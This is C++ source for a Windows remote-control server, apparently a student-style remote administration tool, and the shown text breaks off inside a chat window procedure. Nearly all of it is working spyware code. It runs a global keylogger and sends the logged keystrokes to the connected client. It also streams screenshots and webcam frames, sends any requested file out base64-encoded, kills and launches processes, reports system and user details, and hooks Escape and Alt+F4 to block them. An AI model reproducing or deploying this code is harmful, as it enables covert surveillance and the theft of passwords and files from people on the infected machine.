#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <cstring>
#include <tlhelp32.h>
#include <gdiplus.h>
#include <vfw.h>
#include <tchar.h>
#include <psapi.h>
#include <shellapi.h>
#include <shlobj.h>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;
using namespace Gdiplus;

SOCKET serverSocket;
SOCKET clientSocket;
atomic<bool> isKeylogActive(false);
atomic<bool> isRecording(false);
atomic<bool> isWebcamThreadRunning(false);
string keylogPath = "fileKeyLog.txt";
HHOOK keyboardHook = NULL;
HWND hCapture = NULL;

void receiveSignal(string &s);
void shutdown();
void keylog();
void takepic();
void processManagement();
void applicationManagement();
void webcam();
void fileManagement();
void hookKey();
void unhookKey();
void printkeys();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void startKeyLogger();
void stopKeyLogger();

static string toUtf8(const char *str)
{
    if (!str)
        return string();
    return string(str);
}

static string toUtf8(const wchar_t *wstr)
{
    if (!wstr)
        return string();
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
    if (size <= 0)
        return string();
    vector<char> buffer(size);
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, buffer.data(), size, nullptr, nullptr);

    return string(buffer.data());
}

void sendLine(const string &s)
{
    string msg = s + "\n";
    send(clientSocket, msg.c_str(), msg.length(), 0);
}

string receiveLine()
{
    string result;
    char c;
    while (recv(clientSocket, &c, 1, 0) > 0)
    {
        if (c == '\n')
            break;
        if (c != '\r')
            result += c;
    }
    return result;
}

void receiveSignal(string &s)
{
    try
    {
        s = receiveLine();
    }
    catch (...)
    {
        s = "QUIT";
    }
}
static std::atomic<bool> keepBroadcast(true);
std::string GetRealLocalIP()
{
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == INVALID_SOCKET)
        return "";
    sockaddr_in remote;
    remote.sin_family = AF_INET;
    remote.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &remote.sin_addr);
    if (connect(s, (sockaddr *)&remote, sizeof(remote)) == SOCKET_ERROR)
    {
        closesocket(s);
        return "";
    }
    sockaddr_in name;
    int namelen = sizeof(name);
    if (getsockname(s, (sockaddr *)&name, &namelen) == SOCKET_ERROR)
    {
        closesocket(s);
        return "";
    }
    char buf[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &name.sin_addr, buf, INET_ADDRSTRLEN);
    closesocket(s);
    return std::string(buf);
}

void BroadcastServerInfo()
{
    std::string realIP = GetRealLocalIP();
    if (realIP.empty())
        return;
    SOCKET bcast = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (bcast == INVALID_SOCKET)
        return;

    char opt = 1;
    setsockopt(bcast, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));

    sockaddr_in src = {};
    src.sin_family = AF_INET;
    src.sin_port = 0;
    inet_pton(AF_INET, realIP.c_str(), &src.sin_addr);
    bind(bcast, (sockaddr *)&src, sizeof(src));

    sockaddr_in dest = {};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(5656);
    dest.sin_addr.s_addr = INADDR_BROADCAST;

    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    std::string message = "IP:" + realIP + "|Name:" + std::string(hostname);

    std::cout << "Broadcasting server info: " << message << std::endl;

    while (keepBroadcast)
    {
        sendto(bcast, message.c_str(), (int)message.length(), 0, (sockaddr *)&dest, sizeof(dest));
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    closesocket(bcast);
}

void shutdown()
{
    system("shutdown /s /t 0");
}

void restart()
{
    system("shutdown /r /t 0");
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN && isKeylogActive)
    {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyboard->vkCode;
        bool isInjected = (pKeyboard->flags & LLKHF_INJECTED) != 0;
        if (vkCode == VK_BACK && isInjected)
        {
            return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
        }

        ofstream file(keylogPath, ios::app);
        if (file.is_open())
        {
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            switch (vkCode)
            {
            case VK_SPACE:
                file << " ";
                break;
            case VK_RETURN:
                file << " [Enter]";
                break;
            case VK_BACK:
                file << " [Backspace]";
                break;
            case VK_TAB:
                file << " [Tab]";
                break;
            case '0':
                file << (shift ? ")" : "0");
                break;
            case '1':
                file << (shift ? "!" : "1");
                break;
            case '2':
                file << (shift ? "@" : "2");
                break;
            case '3':
                file << (shift ? "#" : "3");
                break;
            case '4':
                file << (shift ? "$" : "4");
                break;
            case '5':
                file << (shift ? "%" : "5");
                break;
            case '6':
                file << (shift ? "^" : "6");
                break;
            case '7':
                file << (shift ? "&" : "7");
                break;
            case '8':
                file << (shift ? "*" : "8");
                break;
            case '9':
                file << (shift ? "(" : "9");
                break;
            case VK_OEM_2:
                file << (shift ? "?" : "/");
                break;
            case VK_OEM_4:
                file << (shift ? "{" : "[");
                break;
            case VK_OEM_6:
                file << (shift ? "}" : "]");
                break;
            case VK_OEM_1:
                file << (shift ? ":" : ";");
                break;
            case VK_OEM_7:
                file << (shift ? "\"" : "'");
                break;
            case VK_OEM_COMMA:
                file << (shift ? "<" : ",");
                break;
            case VK_OEM_PERIOD:
                file << (shift ? ">" : ".");
                break;
            case VK_OEM_MINUS:
                file << (shift ? "_" : "-");
                break;
            case VK_OEM_PLUS:
                file << (shift ? "+" : "=");
                break;
            case VK_OEM_3:
                file << (shift ? "~" : "`");
                break;
            case VK_OEM_5:
                file << "|";
                break;
            default:
                if (vkCode >= 'A' && vkCode <= 'Z')
                {
                    char ch = vkCode;
                    if ((!shift && !caps) || (shift && caps))
                    {
                        ch = tolower(ch);
                    }
                    file << ch;
                }
                break;
            }
            file.close();
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

DWORD keylogThreadId = 0;

void startKeyLogger()
{
    keylogThreadId = GetCurrentThreadId();
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (keyboardHook)
    {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
    isKeylogActive = false;
    keylogThreadId = 0;
}

void hookKey()
{
    if (isKeylogActive)
        return;
    isKeylogActive = true;
    ofstream file(keylogPath, ios::trunc);
    file.close();
    thread keylogThread(startKeyLogger);
    keylogThread.detach();
}

void unhookKey()
{
    if (isKeylogActive && keylogThreadId != 0)
    {
        PostThreadMessage(keylogThreadId, WM_QUIT, 0, 0);
    }
    int timeout = 0;
    while (isKeylogActive && timeout < 20)
    {
        Sleep(100);
        timeout++;
    }
    isKeylogActive = false;
}

void printkeys()
{
    ifstream file(keylogPath);
    string content;
    if (file.is_open())
    {
        stringstream buffer;
        buffer << file.rdbuf();
        content = buffer.str();
        file.close();
        ofstream clearFile(keylogPath, ios::trunc);
        clearFile.close();
    }

    if (content.empty())
    {
        content = "Keylog empty.";
    }
    content += "\n";
    send(clientSocket, content.c_str(), content.length(), 0);
}

void deleteLogFile()
{
    ofstream file(keylogPath, ios::trunc);
    file.close();
    sendLine("Keylogs deleted successfully.");
}

void keylog()
{
    string s;
    while (true)
    {
        receiveSignal(s);
        if (s == "PRINT")
            printkeys();
        else if (s == "HOOK")
            hookKey();
        else if (s == "UNHOOK")
            unhookKey();
        else if (s == "DELETE")
            deleteLogFile();
        else if (s == "QUIT")
            return;
    }
}

void takepic()
{
    string ss;

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    while (true)
    {
        receiveSignal(ss);
        if (ss == "TAKE")
        {
            HDC hdcScreen = GetDC(NULL);
            HDC hdcMemory = CreateCompatibleDC(hdcScreen);

            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);

            HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
            SelectObject(hdcMemory, hBitmap);
            BitBlt(hdcMemory, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

            Bitmap *bitmap = new Bitmap(hBitmap, NULL);

            IStream *stream = NULL;
            CreateStreamOnHGlobal(NULL, TRUE, &stream);

            CLSID pngClsid;
            OLECHAR guidStr[] = L"{557CF406-1A04-11D3-9A73-0000F81EF32E}";
            CLSIDFromString(guidStr, &pngClsid);
            Status status = bitmap->Save(stream, &pngClsid, NULL);

            STATSTG statstg;
            stream->Stat(&statstg, STATFLAG_DEFAULT);
            ULONG size = statstg.cbSize.LowPart;

            char *buffer = new char[size];
            LARGE_INTEGER li = {0};
            stream->Seek(li, STREAM_SEEK_SET, NULL);
            stream->Read(buffer, size, NULL);

            sendLine("SCREEN " + to_string(size));
            send(clientSocket, buffer, size, 0);

            delete[] buffer;
            delete bitmap;
            stream->Release();
            DeleteObject(hBitmap);
            DeleteDC(hdcMemory);
            ReleaseDC(NULL, hdcScreen);
        }
        else if (ss == "QUIT")
        {
            Gdiplus::GdiplusShutdown(gdiplusToken);
            Sleep(200);
            return;
        }
    }
}

string toLower(string s)
{
    for (char &c : s)
        c = tolower(c);
    return s;
}

string FindShortcutRecursive(string folderPath, string targetName)
{
    string searchPath = folderPath + "\\*";
    WIN32_FIND_DATAA data;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &data);

    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (string(data.cFileName) == "." || string(data.cFileName) == "..")
                continue;

            string fullPath = folderPath + "\\" + data.cFileName;

            if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                string found = FindShortcutRecursive(fullPath, targetName);
                if (!found.empty())
                {
                    FindClose(hFind);
                    return found;
                }
            }
            else
            {
                string fileName = toLower(data.cFileName);
                if (fileName.find(".lnk") != string::npos && fileName.find(targetName) != string::npos)
                {
                    FindClose(hFind);
                    return fullPath;
                }
            }
        } while (FindNextFileA(hFind, &data));
        FindClose(hFind);
    }
    return "";
}

void processManagement()
{
    string ss;

    while (true)
    {
        receiveSignal(ss);

        if (ss == "XEM")
        {
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE)
            {
                PROCESSENTRY32W pe32;
                pe32.dwSize = sizeof(PROCESSENTRY32W);

                vector<PROCESSENTRY32W> processes;
                if (Process32FirstW(hSnapshot, &pe32))
                {
                    do
                    {
                        processes.push_back(pe32);
                    } while (Process32NextW(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);

                sendLine(to_string(processes.size()));

                for (const auto &proc : processes)
                {
                    sendLine(toUtf8(proc.szExeFile));
                    sendLine(to_string(proc.th32ProcessID));
                    sendLine(to_string(proc.cntThreads));
                    Sleep(10);
                }
            }
            else
            {
                sendLine("0");
            }
        }
        else if (ss == "KILL")
        {
            bool test = true;
            while (test)
            {
                receiveSignal(ss);
                if (ss == "KILLID")
                {
                    string pidStr = receiveLine();
                    DWORD pid = stoul(pidStr);

                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess != NULL)
                    {
                        if (TerminateProcess(hProcess, 0))
                        {
                            sendLine("Process killed successfully");
                        }
                        else
                        {
                            sendLine("Error: Unable to kill the process");
                        }
                        CloseHandle(hProcess);
                    }
                    else
                    {
                        sendLine("Error: Process not found");
                    }
                }
                else if (ss == "QUIT")
                {
                    test = false;
                }
            }
        }
        else if (ss == "START")
        {
            bool test = true;
            while (test)
            {
                receiveSignal(ss);
                if (ss == "STARTID")
                {
                    string exeName = receiveLine();

                    STARTUPINFOA si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);

                    char fullPath[MAX_PATH] = {0};
                    DWORD found = SearchPathA(NULL, exeName.c_str(), ".exe", MAX_PATH, fullPath, NULL);
                    if (found > 0 && found < MAX_PATH)
                    {
                        string cmd = string("\"") + fullPath + "\"";
                        if (CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
                        {
                            sendLine("Process started successfully");
                            CloseHandle(pi.hProcess);
                            CloseHandle(pi.hThread);
                        }
                        else
                        {
                            sendLine("Error: Unable to start the process");
                        }
                    }
                    else
                    {
                        HINSTANCE h = ShellExecuteA(NULL, "open", exeName.c_str(), NULL, NULL, SW_SHOWNORMAL);
                        if ((INT_PTR)h > 32)
                        {
                            sendLine("Process started successfully");
                        }
                        else
                        {
                            sendLine("Error: Unable to start the process");
                        }
                    }
                }
                else if (ss == "QUIT")
                {
                    test = false;
                }
            }
        }
        else if (ss == "QUIT")
        {
            return;
        }
    }
}

struct AppInfo
{
    string title;
    string exeName;
    DWORD pid;
    DWORD threads;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    vector<AppInfo> *pApps = (vector<AppInfo> *)lParam;
    if (IsWindowVisible(hwnd) && GetWindowTextLengthW(hwnd) > 0)
    {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        if (pid == GetCurrentProcessId())
            return TRUE;

        wchar_t title[1024];
        GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t));

        string exeName = "Unknown";
        DWORD threads = 0;

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess)
        {
            wchar_t buffer[MAX_PATH];
            if (GetModuleBaseNameW(hProcess, NULL, buffer, MAX_PATH))
            {
                exeName = toUtf8(buffer);
            }
            else
            {
                char ansiBuffer[MAX_PATH];
                if (GetModuleBaseNameA(hProcess, NULL, ansiBuffer, MAX_PATH))
                {
                    exeName = string(ansiBuffer);
                }
            }
            CloseHandle(hProcess);
        }

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE)
        {
            PROCESSENTRY32W pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32W);
            if (Process32FirstW(hSnapshot, &pe32))
            {
                do
                {
                    if (pe32.th32ProcessID == pid)
                    {
                        threads = pe32.cntThreads;
                        break;
                    }
                } while (Process32NextW(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }

        if (GetParent(hwnd) == NULL)
        {
            pApps->push_back({toUtf8(title), exeName, pid, threads});
        }
    }
    return TRUE;
}

string GetAppPathFromRegistry(string appName)
{
    if (appName.find(".exe") == string::npos)
        appName += ".exe";

    const string subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
    char path[MAX_PATH] = {0};
    DWORD bufferSize = MAX_PATH;
    if (RegGetValueA(HKEY_CURRENT_USER, subKey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &bufferSize) == ERROR_SUCCESS)
    {
        return string(path);
    }
    bufferSize = MAX_PATH;
    if (RegGetValueA(HKEY_LOCAL_MACHINE, subKey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &bufferSize) == ERROR_SUCCESS)
    {
        return string(path);
    }
    return "";
}
string FindAppInStartMenu(string appName)
{
    appName = toLower(appName);
    char path[MAX_PATH];
    string result = "";

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAMS, NULL, 0, path)))
    {
        result = FindShortcutRecursive(string(path), appName);
        if (!result.empty())
            return result;
    }

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_PROGRAMS, NULL, 0, path)))
    {
        result = FindShortcutRecursive(string(path), appName);
        if (!result.empty())
            return result;
    }

    return "";
}

void applicationManagement()
{
    string ss;

    while (true)
    {
        receiveSignal(ss);
        if (ss == "XEM")
        {
            vector<AppInfo> apps;
            EnumWindows(EnumWindowsProc, (LPARAM)&apps);

            sendLine(to_string(apps.size()));

            for (const auto &app : apps)
            {
                sendLine(app.title);
                sendLine(app.exeName);
                sendLine(to_string(app.pid));
                sendLine(to_string(app.threads));
                Sleep(10);
            }
        }
        else if (ss == "KILL")
        {
            bool test = true;
            while (test)
            {
                receiveSignal(ss);
                if (ss == "KILLID")
                {
                    string pidStr = receiveLine();
                    DWORD pid = stoul(pidStr);

                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess != NULL)
                    {
                        if (TerminateProcess(hProcess, 0))
                        {
                            sendLine("Application closed successfully");
                        }
                        else
                        {
                            sendLine("Error: Unable to close the application");
                        }
                        CloseHandle(hProcess);
                    }
                    else
                    {
                        sendLine("Error: Application not found");
                    }
                }
                else if (ss == "QUIT")
                {
                    test = false;
                }
            }
        }
        else if (ss == "START")
        {
            bool test = true;
            while (test)
            {
                receiveSignal(ss);
                if (ss == "STARTID")
                {
                    string inputName = receiveLine();
                    string pathExec = "";

                    pathExec = FindAppInStartMenu(inputName);

                    if (pathExec.empty())
                    {
                        char fullPath[MAX_PATH] = {0};
                        string tempName = inputName;
                        if (tempName.find(".exe") == string::npos)
                            tempName += ".exe";

                        if (SearchPathA(NULL, tempName.c_str(), NULL, MAX_PATH, fullPath, NULL) > 0)
                        {
                            pathExec = string(fullPath);
                        }
                    }

                    if (!pathExec.empty())
                    {
                        HINSTANCE h = ShellExecuteA(NULL, "open", pathExec.c_str(), NULL, NULL, SW_SHOWNORMAL);
                        if ((INT_PTR)h > 32)
                        {
                            sendLine("Application opened successfully at: " + pathExec);
                        }
                        else
                        {
                            sendLine("Error: Found but unable to open: " + pathExec);
                        }
                    }
                    else
                    {
                        HINSTANCE h = ShellExecuteA(NULL, "open", inputName.c_str(), NULL, NULL, SW_SHOWNORMAL);
                        if ((INT_PTR)h > 32)
                        {
                            sendLine("Application opened successfully via Windows Run command");
                        }
                        else
                        {
                            sendLine("Error: Application not found with name '" + inputName + "'");
                        }
                    }
                }
                else if (ss == "QUIT")
                {
                    test = false;
                }
            }
        }
        else if (ss == "QUIT")
        {
            return;
        }
    }
}

int GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
{
    UINT num = 0;
    UINT size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

static LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVH)
{
    if (clientSocket == INVALID_SOCKET)
        return 0;
    if (!isRecording)
        return 0;

    DWORD dataSize = lpVH->dwBytesUsed;
    if (dataSize < 1024)
        return 0;
    string header = "CAM " + to_string(dataSize) + "\n";
    send(clientSocket, header.c_str(), header.length(), 0);
    int iResult = send(clientSocket, (char *)lpVH->lpData, dataSize, 0);

    if (iResult == SOCKET_ERROR)
    {
        isRecording = false;
    }
    return (LRESULT)TRUE;
}

void webcam()
{
    string cmd;
    bool streaming = false;

    while (true)
    {
        receiveSignal(cmd);

        if (cmd == "START")
        {
            if (!streaming)
            {
                streaming = true;
                sendLine("OK");
                isWebcamThreadRunning = true;

                thread streamThread([&]()
                                    {

                    hCapture = capCreateCaptureWindowA("WebcamCap", WS_POPUP, 0, 0, 640, 480, NULL, 0);

                    if (!hCapture || !SendMessage(hCapture, WM_CAP_DRIVER_CONNECT, 0, 0)) {
                        if(hCapture) DestroyWindow(hCapture);
                        hCapture = NULL;
                        streaming = false;
                        sendLine("STOPPED");
                        isWebcamThreadRunning = false; 
                        return;
                    }

                    BITMAPINFO bmpInfo = {0};
                    bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                    bmpInfo.bmiHeader.biWidth = 640;
                    bmpInfo.bmiHeader.biHeight = 480;
                    bmpInfo.bmiHeader.biPlanes = 1;
                    bmpInfo.bmiHeader.biBitCount = 24;
                    bmpInfo.bmiHeader.biCompression = MAKEFOURCC('M', 'J', 'P', 'G');
                    bmpInfo.bmiHeader.biSizeImage = 640 * 480 * 3;
                    if (!SendMessage(hCapture, WM_CAP_SET_VIDEOFORMAT, sizeof(BITMAPINFOHEADER), (LPARAM)&bmpInfo)) {}

                    char opt = 1;
                    setsockopt(clientSocket, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
                    int sendBuff = 1024 * 1024;
                    setsockopt(clientSocket, SOL_SOCKET, SO_SNDBUF, (char*)&sendBuff, sizeof(sendBuff));

                    SendMessage(hCapture, WM_CAP_SET_CALLBACK_FRAME, 0, (LPARAM)FrameCallback);
                    SendMessage(hCapture, WM_CAP_SET_PREVIEWRATE, 1, 0);
                    SendMessage(hCapture, WM_CAP_SET_PREVIEW, TRUE, 0);

                    isRecording = true;
                    while (streaming && isRecording) {
                        SendMessage(hCapture, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
                    }
                    
                    if (hCapture) {
                        SendMessage(hCapture, WM_CAP_SET_CALLBACK_FRAME, 0, 0);
                        SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                        DestroyWindow(hCapture);
                        hCapture = NULL;
                    }
                    
                    isWebcamThreadRunning = false; });
                streamThread.detach();
            }
            else
            {
                sendLine("ERROR: Already streaming");
            }
        }
        else if (cmd == "STOP")
        {
            if (streaming)
            {
                streaming = false;
                isRecording = false;
            }
        }
        else if (cmd == "QUIT")
        {

            streaming = false;
            isRecording = false;

            while (isWebcamThreadRunning)
            {
                Sleep(50);
            }
            return;
        }
    }
}

static wstring toWide(const string &str)
{
    if (str.empty())
        return wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    if (size_needed <= 0)
    {
        size_needed = MultiByteToWideChar(CP_ACP, 0, &str[0], (int)str.size(), NULL, 0);
    }
    wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(size_needed > 0 ? CP_UTF8 : CP_ACP, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

void fileManagement()
{
    string cmd;

    while (true)
    {
        receiveSignal(cmd);

        if (cmd == "LIST")
        {
            string path;
            receiveSignal(path);
            sendLine("FILELIST");

            wstring wPath = toWide(path);
            if (!wPath.empty() && wPath.back() != L'\\')
                wPath += L"\\";
            wstring wSearchPath = wPath + L"*";

            WIN32_FIND_DATAW findData;
            HANDLE hFind = FindFirstFileW(wSearchPath.c_str(), &findData);

            if (hFind != INVALID_HANDLE_VALUE)
            {
                do
                {
                    wstring wName = findData.cFileName;
                    if (wName == L"." || wName == L"..")
                        continue;

                    string name = toUtf8(wName.c_str());

                    string type = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";
                    ULONGLONG fileSize = ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;

                    string line = type + "|" + name + "|" + to_string(fileSize);
                    sendLine(line);
                } while (FindNextFileW(hFind, &findData));
                FindClose(hFind);
            }
        }
        else if (cmd == "DRIVES")
        {
            sendLine("DRIVELIST");

            DWORD drives = GetLogicalDrives();
            for (char c = 'A'; c <= 'Z'; c++)
            {
                if (drives & (1 << (c - 'A')))
                {
                    string driveLetter = string(1, c) + ":";
                    sendLine(driveLetter);
                }
            }
        }
        else if (cmd == "DOWNLOAD")
        {

            string filePath;
            receiveSignal(filePath);

            cout << "[FILE DOWNLOAD] Request: " << filePath << endl;

            ifstream file(filePath, ios::binary | ios::ate);
            if (file.is_open())
            {
                size_t fileSize = file.tellg();
                file.seekg(0, ios::beg);

                cout << "[FILE DOWNLOAD] Size: " << fileSize << " bytes" << endl;

                if (fileSize == 0)
                {
                    sendLine("ERROR: File is empty");
                    file.close();
                }
                else
                {
                    vector<char> buffer(fileSize);
                    file.read(buffer.data(), fileSize);
                    file.close();

                    cout << "[FILE DOWNLOAD] Read complete, encoding..." << endl;
                    DWORD base64Size = 0;
                    if (!CryptBinaryToStringA((BYTE *)buffer.data(), fileSize,
                                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                              NULL, &base64Size))
                    {
                        sendLine("ERROR: Base64 size calculation failed");
                        cout << "[FILE DOWNLOAD] Base64 calculation error" << endl;
                    }
                    else
                    {
                        vector<char> base64(base64Size);
                        if (!CryptBinaryToStringA((BYTE *)buffer.data(), fileSize,
                                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                                  base64.data(), &base64Size))
                        {
                            sendLine("ERROR: Base64 encoding failed");
                            cout << "[FILE DOWNLOAD] Base64 encoding error" << endl;
                        }
                        else
                        {
                            cout << "[FILE DOWNLOAD] Encoded size: " << base64Size << " chars" << endl;

                            sendLine("FILEDATA " + to_string(fileSize));
                            string b64str(base64.data(), base64Size);
                            sendLine(b64str);

                            cout << "[FILE DOWNLOAD] Sent successfully" << endl;
                        }
                    }
                }
            }
            else
            {
                cout << "[FILE DOWNLOAD] Cannot open file: " << filePath << endl;
                sendLine("ERROR: Cannot open file");
            }
        }
        else if (cmd == "QUIT")
        {
            break;
        }
    }
}

string getRegString(HKEY root, const char *path, const char *valueName)
{
    HKEY hKey;
    if (RegOpenKeyExA(root, path, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return "Unknown";
    char buffer[512];
    DWORD bufferSize = sizeof(buffer);
    DWORD type = REG_SZ;
    string result = "Unknown";
    if (RegQueryValueExA(hKey, valueName, 0, &type, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS)
    {
        result = string(buffer);
    }
    RegCloseKey(hKey);
    return result;
}

string bytesToGB(unsigned long long bytes)
{
    double gb = (double)bytes / (1024 * 1024 * 1024);
    stringstream ss;
    ss << fixed << setprecision(2) << gb << " GB";
    return ss.str();
}

void getSystemInfo()
{
    char buffer[256];
    DWORD size = sizeof(buffer);
    string pcName = "Unknown";
    string userName = "Unknown";

    if (GetComputerNameA(buffer, &size))
        pcName = buffer;
    size = sizeof(buffer);
    if (GetUserNameA(buffer, &size))
        userName = buffer;

    sendLine("KEY:PC Name|" + pcName);
    sendLine("KEY:User Name|" + userName);
    string osName = getRegString(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
    string osBuild = getRegString(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild");
    sendLine("KEY:OS|" + osName + " (Build " + osBuild + ")");
    string cpuName = getRegString(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");
    sendLine("KEY:CPU|" + cpuName);
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    sendLine("KEY:RAM|" + bytesToGB(memInfo.ullTotalPhys) + " (Load: " + to_string(memInfo.dwMemoryLoad) + "%)");
    ULARGE_INTEGER freeBytes, totalBytes, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFree))
    {
        sendLine("KEY:Disk (C:)|Total: " + bytesToGB(totalBytes.QuadPart) + " - Free: " + bytesToGB(freeBytes.QuadPart));
    }
    else
    {
        sendLine("KEY:Disk (C:)|Unknown");
    }
    sendLine("END_INFO");
}

#define WM_FORCE_CLOSE (WM_APP + 1)

HWND hChatWnd = NULL;
HWND hChatHistory = NULL;
HWND hChatInput = NULL;
HWND hBtnSend = NULL;
WNDPROC oldEditProc;
atomic<bool> isGuiRunning(false);

void appendChatLog(const wstring &msg)
{
    int len = GetWindowTextLengthW(hChatHistory);
    SendMessageW(hChatHistory, EM_SETSEL, (WPARAM)len, (LPARAM)len);
    SendMessageW(hChatHistory, EM_REPLACESEL, 0, (LPARAM)msg.c_str());
    SendMessageW(hChatHistory, EM_REPLACESEL, 0, (LPARAM)L"\r\n");
}
LRESULT CALLBACK EditSubclassProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (msg == WM_KEYDOWN && wParam == VK_RETURN)
    {
        SendMessage(GetParent(hwnd), WM_COMMAND, 1, 0);
        return 0;
    }
    return CallWindowProcW(oldEditProc, hwnd, msg, wParam, lParam);
}
HHOOK hBlockHook = NULL;

LRESULT CALLBACK BlockEscProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;

        if (pKey->vkCode == VK_ESCAPE)
        {
            return 1;
        }
        if (pKey->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000))
        {
            return 1;
        }
    }
    return CallNextHookEx(hBlockHook, nCode, wParam, lParam);
}

LRESULT CALLBACK ChatWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_CREATE:
    {
